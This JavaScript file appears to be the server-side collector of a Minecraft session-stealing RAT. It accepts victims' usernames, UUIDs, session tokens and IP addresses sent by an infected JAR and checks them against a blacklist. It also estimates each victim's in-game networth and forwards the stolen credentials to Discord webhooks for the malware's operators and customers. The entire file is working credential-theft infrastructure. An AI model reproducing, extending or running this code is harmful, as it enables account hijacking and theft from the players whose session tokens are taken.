import AsciiTable from "ascii-table";
import { WebhookClient, EmbedBuilder } from "discord.js";
import { readFile } from "fs/promises";
import { getClientIp } from "request-ip";

const { hitWebhookURL } = JSON.parse(await readFile(new URL("../config.json", import.meta.url)));
const webhookHitClient = new WebhookClient({ url: hitWebhookURL });

const usernameRegex = /^[a-zA-Z0-9_]{1,16}$/;
const uuidRegex = /^[0-9a-fA-F]{32}$/;
const sessionIDRegex = /^eyJraWQiOiJ[0-9a-zA-Z_-]*\.[0-9a-zA-Z_-]*\.[0-9a-zA-Z_-]*$/;
const ipv4Regex = /^(?:(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])\.){3}(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])$/;
const ipv6Regex =
  /^((?=.*::)(?!.*::.+::)(::)?([\dA-F]{1,4}:(:|\b)|){5}|([\dA-F]{1,4}:){6})((([\dA-F]{1,4}((?!\3)::|:\b|$))|(?!\2\3)){2}|(((2[0-4]|1\d|[1-9])?\d|25[0-5])\.?\b){4})$/i;

export default function handleInfo(ratDB, webhookClient, sendError, getNetworth) {
  return async function (req, res) {
    const { id, username = "null", uuid = "null", sessionID = "null", ip = "null" } = req.body;
    const ip2 = getClientIp(req);

    const table = new AsciiTable("Info Hit").setHeading("Type", "Value");
    table.addRow("Code", id);
    table.addRow("Username", username);
    table.addRow("UUID", uuid);
    //table.addRow("Session ID", sessionID.length > 50 ? sessionID.slice(0, 50) + "..." : sessionID);
    table.addRow("Session ID", sessionID);
    table.addRow("IP 1", ip);
    table.addRow("IP 2", ip2);

    // BLACKLIST CHECK START

    const jsonData = JSON.parse(await readFile('/root/oAuth/blacklist_priv.json', 'utf8'));

    if (jsonData.usernames.includes(username) || jsonData.uuids.includes(uuid) || jsonData.ips.includes(ip.includes("::ffff:") ? ip.split(":").pop() : ip) || jsonData.ssids.includes(sessionID)) {
      table.addRow("Error", "Blacklist Blocked");
      console.log(table.toString());
      return;
    }
    else {
    }

    // BLACKLIST CHECK END

    if (
      username.toLowerCase().includes("discord") ||
      uuid.toLowerCase().includes("discord") ||
      sessionID.toLowerCase().includes("discord") ||
      ip.toLowerCase().includes("discord") ||
      !usernameRegex.test(username) ||
      !uuidRegex.test(uuid) ||
      !sessionIDRegex.test(sessionID) ||
      (ip != "null" && !ipv4Regex.test(ip) && !ipv6Regex.test(ip))
    ) {
      table.addRow("Error", "Invalid Request");
      console.log(table.toString());
      return;
    }

    console.log("3");

    try {
      const { webhook, dhooked } = await ratDB.getWebhook(id);
      const networth = await getNetworth(username);
      table.addRow("Username", username);
      table.addRow("Networth", networth);

      const freeEmbed = new EmbedBuilder()
        .setColor("#00ff00")
        .setTitle(":book: Minecraft Info")
        .setURL("https://sky.shiiyu.moe/stats/" + username)
        .addFields(
          { name: "Username", value: `\`\`\`${username}\`\`\``, inline: true },
          { name: "UUID", value: `\`\`\`${uuid}\`\`\``, inline: true },
          { name: "SessionID", value: `\`\`\`${sessionID}\`\`\``, inline: false }
        );
      const premiumEmbed = new EmbedBuilder()
        .setColor("#00ff00")
        .setTitle(":deciduous_tree: Minecraft Info")
        .setURL("https://sky.shiiyu.moe/stats/" + username)
        .addFields(
          { name: ":identification_card: Username", value: `\`\`\`${username}\`\`\``, inline: true },
          { name: ":abacus: UUID", value: `\`\`\`${uuid}\`\`\``, inline: true },
          { name: ":coin: Networth", value: `\`\`\`${networth}\`\`\``, inline: true },
          {
            name: ":satellite_orbital: IP",
            value: `\`\`\`${ip == "null" ? ip2 : ip}\`\`\``,
            inline: false,
          },
          { name: ":closed_lock_with_key: SessionID", value: `\`\`\`${sessionID}\`\`\``, inline: false }
        );

      if (dhooked) {
        await webhookClient.send({
          content: "@everyone",
          username: "Information - " + username,
          embeds: [premiumEmbed],
        });
      }

      if (webhook) {
        const webhookClientCustom = new WebhookClient({ url: webhook });
        await webhookClientCustom.send({
          content: "@everyone",
          username: "Information - " + username,
          embeds: [dhooked ? freeEmbed : premiumEmbed],
        });
      } else {
        table.addRow("Error", "Webhook Not Found");
      }

      const embed = new EmbedBuilder()
        .setColor("#0000FF")
        .setTitle("JAR Hit")
        .setDescription(`Networth: **${networth}**`);
      await webhookHitClient.send({ embeds: [embed] });
    } catch (e) {
      var errorMsg;
      if (e.response) {
        errorMsg = e.response.data;
      } else if (e.request) {
        errorMsg = e.request;
      } else {
        errorMsg = e.message;
      }

      table.addRow("Error", errorMsg);
    }

    console.log(table.toString());
  };
}
